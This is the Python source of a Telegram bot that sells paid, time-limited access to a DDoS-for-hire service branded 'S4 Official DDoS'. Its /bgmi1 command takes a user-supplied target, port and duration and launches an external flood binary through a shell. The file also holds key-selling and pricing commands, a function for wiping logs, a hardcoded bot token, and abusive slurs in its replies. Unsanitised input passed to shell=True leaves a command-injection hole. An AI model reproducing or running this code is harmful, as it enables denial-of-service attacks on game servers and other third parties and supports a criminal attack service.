import telebot
import subprocess
import datetime
import os
import random
import string
import json


# Insert your Telegram bot token here
bot = telebot.TeleBot('7258903926:AAHYwGNnqw9geQH6bz_iQkAV3nilBtx0fOI')
# Admin user IDs
admin_id = {"6034912140"}

# Files for data storage
USER_FILE = "users.json"
LOG_FILE = "log.txt"
KEY_FILE = "keys.json"

# Cooldown settings
COOLDOWN_TIME = 0  # in seconds
CONSECUTIVE_ATTACKS_LIMIT = 4
CONSECUTIVE_ATTACKS_COOLDOWN = 180  # in seconds

# In-memory storage
users = {}
keys = {}
bgmi_cooldown = {}
consecutive_attacks = {}

# Read users and keys from files initially
def load_data():
    global users, keys
    users = read_users()
    keys = read_keys()

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

def read_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file)

def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else f"UserID: {user_id}"

    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                return "𝐋𝐨𝐠𝐬 𝐰𝐞𝐫𝐞 𝐀𝐥𝐫𝐞𝐚𝐝𝐲 𝐅𝐮𝐜𝐤𝐞𝐝"
            else:
                file.truncate(0)
                return "𝐅𝐮𝐜𝐤𝐞𝐝 𝐓𝐡𝐞 𝐋𝐨𝐠𝐬 𝐒𝐮𝐜𝐜𝐞𝐬𝐟𝐮𝐥𝐥𝐲✅"
    except FileNotFoundError:
        return "𝐋𝐨𝐠𝐬 𝐖𝐞𝐫𝐞 𝐀𝐥𝐫𝐞𝐚𝐝𝐲 𝐅𝐮𝐜𝐤𝐞𝐝."

def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"

    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

def generate_key(length=6):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def add_time_to_current_date(hours=0, days=0):
    return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')

@bot.message_handler(commands=['genkey'])
def generate_key_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) == 3:
            try:
                time_amount = int(command[1])
                time_unit = command[2].lower()
                if time_unit == 'hours':
                    expiration_date = add_time_to_current_date(hours=time_amount)
                elif time_unit == 'days':
                    expiration_date = add_time_to_current_date(days=time_amount)
                else:
                    raise ValueError("Invalid time unit")
                key = generate_key()
                keys[key] = expiration_date
                save_keys()
                response = f"𝐊𝐞𝐲 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐢𝐨𝐧: {key}\n𝐄𝐬𝐩𝐢𝐫𝐞𝐬 𝐎𝐧: {expiration_date}"
            except ValueError:
                response = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐒𝐩𝐞𝐜𝐢𝐟𝐲 𝐀 𝐕𝐚𝐥𝐢𝐝 𝐍𝐮𝐦𝐛𝐞𝐫 𝐚𝐧𝐝 𝐮𝐧𝐢𝐭 𝐨𝐟 𝐓𝐢𝐦𝐞 (hours/days)."
        else:
            response = "𝐔𝐬𝐚𝐠𝐞: /genkey <amount> <hours/days>"
    else:
        response = "🍁 𝙊𝙉𝙇𝙔 𝙆𝙀𝙔 𝙁𝙍𝙊𝙈 🍁@Sonulakhera786"

    bot.reply_to(message, response)

@bot.message_handler(commands=['redeem'])
def redeem_key_command(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    if len(command) == 2:
        key = command[1]
        if key in keys:
            expiration_date = keys[key]
            if user_id in users:
                user_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
                new_expiration_date = max(user_expiration, datetime.datetime.now()) + datetime.timedelta(hours=1)
                users[user_id] = new_expiration_date.strftime('%Y-%m-%d %H:%M:%S')
            else:
                users[user_id] = expiration_date
            save_users()
            del keys[key]
            save_keys()
            response = f"\n✅ 𝐀𝐂𝐂𝐄𝐒𝐒 𝐆𝐑𝐀𝐍𝐓𝐄𝐃 ✅\n\n🌊 𝐘𝐎𝐔 𝐂𝐀𝐍 𝐔𝐒𝐄 𝐀𝐍𝐃 𝐄𝐍𝐉𝐎𝐘 🌊\n"
        else:
            response = "⚠️ 𝙑𝘼𝙇𝙄𝘿 𝙆𝙀𝙔 𝙉𝙊𝙏 𝙁𝙊𝙐𝙉𝘿 ⚠️\n𝙀𝙉𝙏𝙀𝙍 𝙏𝙃𝙀 𝙑𝘼𝙇𝙄𝘿 𝙆𝙀𝙔 𝙋𝙇𝙀𝘼𝙎𝙀 \n\n𝘾𝙊𝙉𝙏𝙀𝘾𝙏 --> @Sonulakhera786\n\n𝙑𝙄𝙋 𝙐𝙎𝙀𝙍 𝘾𝘼𝙉 𝙐𝙎𝙀 𝙏𝙃𝙄𝙎 𝘾𝙊𝙈𝙈𝘼𝙉𝘿"
    else:
        response = "𝐔𝐬𝐚𝐠𝐞: /redeem <key>"

    bot.reply_to(message, response)

@bot.message_handler(commands=['bgmi1'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    
    if user_id in users:
        expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
        if datetime.datetime.now() > expiration_date:
            response = "❌𝙔𝙤𝙪 𝘼𝙧𝙚 𝙉𝙤𝙩 𝘼𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙏𝙤 𝙐𝙨𝙚 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙❌"
            bot.reply_to(message, response)
            return
        
        if user_id not in admin_id:
            if user_id in bgmi_cooldown:
                time_since_last_attack = (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds
                if time_since_last_attack < COOLDOWN_TIME:
                    cooldown_remaining = COOLDOWN_TIME - time_since_last_attack
                    response = f"🚨 𝑅𝐸𝑀𝐸𝑀𝐵𝐸𝑅 🚨\n\n⏳ᑕᗝᗝᒪᗪᗝᗯᑎ 丅Ꭵᗰᗴ⏳\n🗣️𝐏𝐋𝐄𝐀𝐒𝐄 𝐖𝐀𝐈𝐓 {cooldown_remaining} 𝐒𝐄𝐂.\n\n🗣️𝐔𝐒𝐄 𝐀𝐍𝐎𝐓𝐇𝐄𝐑 [ /𝐛𝐠𝐦𝐢𝟐 ] 𝐁𝐎𝐓\n---------------------------------------\n"
                    bot.reply_to(message, response)
                    return
                
                if consecutive_attacks.get(user_id, 0) >= CONSECUTIVE_ATTACKS_LIMIT:
                    if time_since_last_attack < CONSECUTIVE_ATTACKS_COOLDOWN:
                        cooldown_remaining = CONSECUTIVE_ATTACKS_COOLDOWN - time_since_last_attack
                        response = f"🚨 𝑅𝐸𝑀𝐸𝑀𝐵𝐸𝑅 🚨\n\n⏳ᑕᗝᗝᒪᗪᗝᗯᑎ 丅Ꭵᗰᗴ⏳\n🗣️𝐏𝐋𝐄𝐀𝐒𝐄 𝐖𝐀𝐈𝐓 {cooldown_remaining} 𝐒𝐄𝐂.\n\n🗣️𝐔𝐒𝐄 𝐀𝐍𝐎𝐓𝐇𝐄𝐑 [ /𝐛𝐠𝐦𝐢𝟐 ] 𝐁𝐎𝐓\n---------------------------------------\n"
                        bot.reply_to(message, response)
                        return
                    else:
                        consecutive_attacks[user_id] = 0

            bgmi_cooldown[user_id] = datetime.datetime.now()
            consecutive_attacks[user_id] = consecutive_attacks.get(user_id, 0) + 1

        command = message.text.split()
        if len(command) == 4:
            target = command[1]
            try:
                port = int(command[2])
                time = int(command[3])
                if time > 240:
                    response = "ᗴᖇᖇᗝᖇ 丅Ꭵᗰᗴ ᖴᗝᖇᗰᗩ丅\n\n🇪 🇳 🇹 🇪 🇷  --> 240✓\n\nT͢H͢A͢N͢K͢S͢ F͢O͢R͢ U͢S͢I͢N͢G͢ ❤️ "
                else: 
                    record_command_logs(user_id, '/bgmi1', target, port, time)
                    log_command(user_id, target, port, time)
                    start_attack_reply(message, target, port, time)
                    full_command = f"./S4 {target} {port} {time} 100"
                    subprocess.run(full_command, shell=True)
                    response = f"❌⚠️ ΔŦŦΔĆҜ 𝟏 ₣ƗŇƗŞĦ€Đ ⚠️❌\n\n𝐓𝐀𝐑𝐆𝐄𝐓 --> {target}\n𝐏𝐎𝐑𝐓 --> {port}\n𝐓𝐈𝐌𝐄 --> {time} 𝐒𝐄𝐂.\n\n🌹𝐒𝟒 𝐎𝐅𝐅𝐈𝐂𝐈𝐀𝐋 𝐃𝐃𝐎𝐒🌹"
            except ValueError:
                response = "𝐄𝐑𝐑𝐎𝐑»𝐈𝐏 𝐏𝐎𝐑T"
        else:
            response = "✅ᴘʟᴇᴀꜱᴇ ꜱᴀᴛɪꜱꜰɪᴇᴅ ᴀᴛᴛᴀᴄᴋ ✅\n\n/ʙɢᴍɪ𝟏 <ᴛᴀʀɢᴇᴛ><ᴘᴏʀᴛ><ᴛɪᴍᴇ>\n\n=====================\nENJOY AND SEND FEEDBACK"
    else:
        response = "ʏᴏᴜʀ ᴀʀᴇ ɴᴏᴛ ᴀᴘᴘʀᴏᴠᴇ \nᴛᴏ ᴜꜱᴇ ᴛʜɪꜱ ʙᴏᴛ ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ>> @Sonulakhera786"

    bot.reply_to(message, response)

def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    response = f"🧭 🐼𝐀𝐓𝐓𝐀𝐂𝐊 𝟏 𝐒𝐓𝐀𝐑𝐓🐼 🧭\n\n🦞丅ᗩᖇǤᗴ丅 {target}\n🛞ᑭᗝᖇ丅 {port}\n📟丅Ꭵᗰᗴ {time} $ᗴᑕ.\n𝐅𝐄𝐄𝐃𝐁𝐀𝐂𝐊 𝐃𝐀𝐀𝐋 𝐃𝐄\n\n🌹𝐒𝟒 𝐎𝐅𝐅𝐈𝐂𝐈𝐀𝐋 𝐃𝐃𝐎𝐒🌹"
    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        response = clear_logs()
    else:
        response = "❌𝐘𝐎𝐔 𝐀𝐑𝐄 𝐍𝐎𝐓 𝐔𝐒𝐄 𝐓𝐇𝐈𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 ❌"
    bot.reply_to(message, response)

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if users:
            response = "𝐔𝐒𝐑𝐄𝐑 𝐋𝐈𝐒𝐓:\n"
            for user_id, expiration_date in users.items():
                try:
                    user_info = bot.get_chat(int(user_id))
                    username = user_info.username if user_info.username else f"UserID: {user_id}"
                    response += f"- @{username} (ID: {user_id}) expires on {expiration_date}\n"
                except Exception:
                    response += f"- 𝐔𝐬𝐞𝐫 𝐢𝐝: {user_id} 𝐄𝐱𝐩𝐢𝐫𝐞𝐬 𝐨𝐧 {expiration_date}\n"
        else:
            response = "𝐀𝐣𝐢 𝐋𝐚𝐧𝐝 𝐌𝐞𝐫𝐚"
    else:
        response = "❌𝐘𝐎𝐔 𝐀𝐑𝐄 𝐍𝐎𝐓 𝐔𝐒𝐄 𝐓𝐇𝐈𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 ❌"
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "𝐀𝐣𝐢 𝐥𝐚𝐧𝐝 𝐦𝐞𝐫𝐚 𝐍𝐎 𝐃𝐀𝐓𝐀 𝐅𝐎𝐔𝐍𝐃."
                bot.reply_to(message, response)
        else:
            response = "𝐀𝐣𝐢 𝐥𝐚𝐧𝐝 𝐦𝐞𝐫𝐚 𝐌𝐄𝐑𝐀 𝐍𝐎 𝐃𝐀𝐓𝐀 𝐅𝐎𝐔𝐍𝐃"
            bot.reply_to(message, response)
    else:
        response = "❌𝐘𝐎𝐔 𝐀𝐑𝐄 𝐍𝐎𝐓 𝐔𝐒𝐄 𝐓𝐇𝐈𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 ❌"
        bot.reply_to(message, response)

@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"𝐓𝐄𝐑𝐈 𝐈𝐃: {user_id}"
    bot.reply_to(message, response)

@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in users:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Y⋆O⋆U⋆R⋆ ⋆A⋆L⋆L⋆ ⋆A⋆T⋆T⋆A⋆C⋆K⋆ ⋆F⋆I⋆L⋆E⋆ ⋆I⋆S⋆ ⋆H⋆E⋆R⋆E\n" + "".join(user_logs)
                else:
                    response = "Y▪O▪U▪R▪ ▪A▪T▪T▪A▪C▪K▪S▪ ▪N▪O▪T▪ ▪F▪O▪U▪N▪D"
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "❌𝐘𝐎𝐔 𝐀𝐑𝐄 𝐍𝐎𝐓 𝐔𝐒𝐄 𝐓𝐇𝐈𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 ❌"

    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = '''W͢E͢L͢C͢O͢M͢E͢ B͢R͢O͢T͢H͢E͢R͢
    
🧞 𝘼𝙏𝙏𝘼𝘾𝙆 𝘾𝙊𝙈𝙈𝘼𝙉𝘿 --> /bgmi1
🧞 𝙂𝙍𝙋. 𝙍𝙐𝙇𝙀𝙎 𝘾𝙈𝘿. --> /rules
🧞 𝘾𝙃𝙀𝘾𝙆 𝙔𝙊𝙐𝙍 𝘼𝙏𝙏𝘼𝘾𝙆𝙎 --> /mylogs
🧞 𝙋𝙀𝙍𝙎𝙊𝙉𝘼𝙇 𝘽𝙊𝙏 𝘾𝙈𝘿 --> /plan
🧞 𝙈𝙔 𝙏𝙂 𝙄𝘿 --> /id
🧞 𝘾𝘼𝙇𝙇 𝙈𝙀 𝙊𝙒𝙉𝙀𝙍 --> /owner

⚠️𝘍𝘌𝘌𝘋𝘉𝘈𝘊𝘒 𝘔𝘜𝘚𝘛 𝘙𝘌𝘘𝘜𝘐𝘙𝘌𝘋⚠️
'''
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''❤️ ʜᴀʏ ʙʀᴏᴛʜᴇʀ ❤️\n\n ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴛʜᴇ ꜱ4 ᴏꜰꜰɪᴄɪᴀʟ ᴅᴅᴏꜱ \nᴡᴏʟᴅ ʙᴇꜱᴛ ᴅᴅᴏꜱ ꜱᴇʀᴠɪᴄᴇ ᴘʀᴏᴠɪᴅᴇ \nᴛʀʏ ᴛᴏ ʀᴜɴ ᴛʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ /help ᴀɴᴅ ɢᴇᴛ ᴀʟʟ ᴅᴇᴛᴀɪʟꜱ
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 

𝙉𝙊 𝙍𝙐𝙇𝙀𝙎 𝘽u𝙏 𝘿𝙊𝙉'𝙏 𝙋𝙍𝙊𝙈𝙊𝙏𝙄𝙊𝙉

𝙃𝙄𝙋 𝙃𝙄𝙋 𝙃𝙐𝙍𝙀𝙀𝙀𝙀 😆
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} ❤️
    
𝘽𝙀𝙎𝙏 𝘿𝙀𝘼𝙇𝙎 🤝 💸:
𝟷 𝙷𝙾𝚄𝚁 --> 𝟸𝟶 
𝟸 𝙷𝙾𝚄𝚁 --> 𝟹𝟶 
𝟷 𝙳𝙰𝚈 --> 𝟽𝟶 
𝟸 𝙳𝙰𝚈 --> 𝟷𝟹𝟶 
𝟽 𝙳𝙰𝚈 --> 𝟻𝟶𝟶 
𝟷 𝙼𝙾𝙽𝚃𝙷 --> 𝟷𝟹𝟶𝟶 

𝙻𝙸𝙵𝙴𝚃𝙸𝙼𝙴 𝙽𝙾𝚃 𝙰𝚅𝙰𝙸𝙻𝙰𝙱𝙻𝙴
🅳🅼 🅾🅽🅻🆈 --> @Sonulakhera786
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def admin_commands(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 𝐋𝐞 𝐫𝐞 𝐥𝐮𝐧𝐝 𝐊𝐞 𝐘𝐞 𝐑𝐡𝐞 𝐓𝐞𝐫𝐞 𝐜𝐨𝐦𝐦𝐚𝐧𝐝:

💥 /genkey 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞 𝐚 𝐤𝐞𝐲.
💥 /allusers: 𝐋𝐢𝐬𝐭 𝐨𝐟 𝐜𝐡𝐮𝐭𝐲𝐚 𝐮𝐬𝐞𝐫𝐬.
💥 /logs: 𝐒𝐡𝐨𝐰 𝐥𝐨𝐠𝐬 𝐟𝐢𝐥𝐞.
💥 /clearlogs: 𝐅𝐮𝐜𝐤 𝐓𝐡𝐞 𝐥𝐨𝐆 𝐟𝐢𝐥𝐞.
💥 /broadcast <message>: 𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭.
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) == 2:
            target_user_id = command[1]
            if target_user_id in users:
                del users[target_user_id]
                save_users()
                response = f"𝐔𝐬𝐞𝐫 {target_user_id} 𝐒𝐮𝐜𝐜𝐞𝐬𝐟𝐮𝐥𝐥𝐲 𝐅𝐮𝐂𝐤𝐞𝐃."
            else:
                response = "𝐋𝐎𝐋 𝐮𝐬𝐞𝐫 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝😂"
        else:
            response = "Usage: /remove <user_id>"
    else:
        response = "𝐎𝐍𝐋𝐘 𝐁𝐎𝐓 𝐊𝐄 𝐏𝐄𝐄𝐓𝐀𝐉𝐈 𝐂𝐀𝐍 𝐃𝐎 𝐓𝐇𝐈𝐒"

    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "𝐌𝐄𝐒𝐒𝐀𝐆𝐄 𝐅𝐑𝐎𝐌 𝐘𝐎𝐔𝐑 𝐅𝐀𝐓𝐇𝐄𝐑:\n\n" + command[1]
            for user_id in users:
                try:
                    bot.send_message(user_id, message_to_broadcast)
                except Exception as e:
                    print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast message sent successfully to all users 👍."
        else:
            response = "𝐁𝐑𝐎𝐀𝐃𝐂𝐀𝐒𝐓 𝐊𝐄 𝐋𝐈𝐘𝐄 𝐌𝐄𝐒𝐒𝐀𝐆𝐄 𝐓𝐎 𝐋𝐈𝐊𝐇𝐃𝐄 𝐆𝐀𝐍𝐃𝐔"
    else:
        response = "𝐎𝐍𝐋𝐘 𝐁𝐎𝐓 𝐊𝐄 𝐏𝐄𝐄𝐓𝐀𝐉𝐈 𝐂𝐀𝐍 𝐑𝐔𝐍 𝐓𝐇𝐈𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃"

    bot.reply_to(message, response)

while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)

